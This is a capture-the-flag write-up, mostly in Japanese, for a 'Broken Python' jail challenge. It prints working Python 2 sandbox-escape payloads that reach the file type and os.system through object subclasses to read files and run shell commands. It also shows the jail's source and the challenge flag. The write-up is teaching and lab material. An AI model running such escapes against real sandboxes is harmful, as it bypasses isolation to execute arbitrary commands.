# Broken Python

## Description

382

Please help me read the flag. I thought I knew python but this python shell is broken.

## writeup

python3でprint文が動かず、試しに2系の構文を打つとエラーが返ってこなかったので、2系でフラグを得なければならないと判断しました。
linux問でもこういう入力が制限された問題だったので、linux jailからpython jailなどで調べました。
__builtin__のメソッドを中心に調査し、flag.txtのreadを実行すると、ソースコードを読めと返ってきました。そこで、lsを実行すると`jail.py`というファイルが確認できました。あとは同様にreadすればフラグが読めました。


```python
 print  ().__class__.__bases__[0].__subclasses__()[40]('./flag.txt').read()
The flag is in the source code.
>>> print ().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
#
flag.txt
jail.py
start.sh
0
>>> print  ().__class__.__bases__[0].__subclasses__()[40]('./jail.py').read()
#!/usr/bin/python

import sys

class Sandbox(object):
    def execute(self, code_string):
        exec(code_string)
        sys.stdout.flush()

sandbox = Sandbox()

_raw_input = raw_input

main = sys.modules["__main__"].__dict__
orig_builtins = main["__builtins__"].__dict__

builtins_whitelist = set((
    #exceptions
    'ArithmeticError', 'AssertionError', 'AttributeError', 'Exception',

    #constants
    'False', 'None', 'True',

    #types
    'basestring', 'bytearray', 'bytes', 'complex', 'dict',

    #functions
    'abs', 'bin', 'dir', 'help'

    # blocked: eval, execfile, exit, file, quit, reload, import, etc.
))

for builtin in orig_builtins.keys():
    if builtin not in builtins_whitelist:
        del orig_builtins[builtin]

print("Find the flag.")
sys.stdout.flush()

def flag_function():
    flag = "OFPPT-CTF{py7h0n_br34k_1s_l1k3_pr1s0n_br34k_sh0w}"

while 1:
    try:
        sys.stdout.write(">>> ")
        sys.stdout.flush()
        code = _raw_input()
        sandbox.execute(code)

    except Exception:
        print("You have encountered an error.")
        sys.stdout.flush()
>>>
```

## FLAG

```bash
OFPPT-CTF{py7h0n_br34k_1s_l1k3_pr1s0n_br34k_sh0w}
```

## 参考

- https://ctf-wiki.mahaloz.re/pwn/linux/sandbox/python-sandbox-escape/
